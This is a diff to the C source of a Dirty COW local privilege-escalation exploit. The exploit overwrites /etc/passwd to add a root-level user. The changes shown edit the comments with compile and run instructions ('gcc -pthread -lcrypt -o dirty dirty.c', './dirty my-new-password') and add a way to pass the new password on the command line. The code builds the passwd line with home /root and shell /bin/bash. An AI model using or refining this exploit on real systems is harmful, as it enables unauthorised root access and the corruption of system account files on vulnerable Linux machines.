@@ -7,22 +7,21 @@
 // created user.
 //
 // Original exploit:
-// https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c
+//   https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c
 //
-// To use this exploit modify the user values according to your needs
+// To use this exploit modify the user values according to your needs.
 //
-// Compile with
+// Compile with:
+//   gcc -pthread -lcrypt -o dirty dirty.c
 //
-// gcc -pthread dirty.c -o dirty -lcrypt
-//
-// and just run the newly create binary with ./dirty
+// Then run the newly create binary by either doing:
+//   "./dirty" or "./dirty my-new-password"
 //
 // DON'T FORGET TO RESTORE YOUR /etc/passwd AFTER RUNNING THE EXPLOIT !
 //
 // Exploit adopted by Christian "FireFart" Mehlmauer
 // https://firefart.at
 //
-
 
 #include <fcntl.h>
 #include <pthread.h>
@@ -131,7 +130,15 @@ int main(int argc, char *argv[])
   user.home_dir = "/root";
   user.shell = "/bin/bash";
 
-  char *plaintext_pw = getpass("Please enter new password: ");
+  char *plaintext_pw;
+
+  if (argc >= 2) {
+    plaintext_pw = argv[1];
+    printf("Please enter the new password: %s\n", plaintext_pw);
+  } else {
+    plaintext_pw = getpass("Please enter the new password: ");
+  }
+
   user.hash = generate_password_hash(plaintext_pw);
   char *complete_passwd_line = generate_passwd_line(user);
   printf("Complete line:\n%s\n", complete_passwd_line);
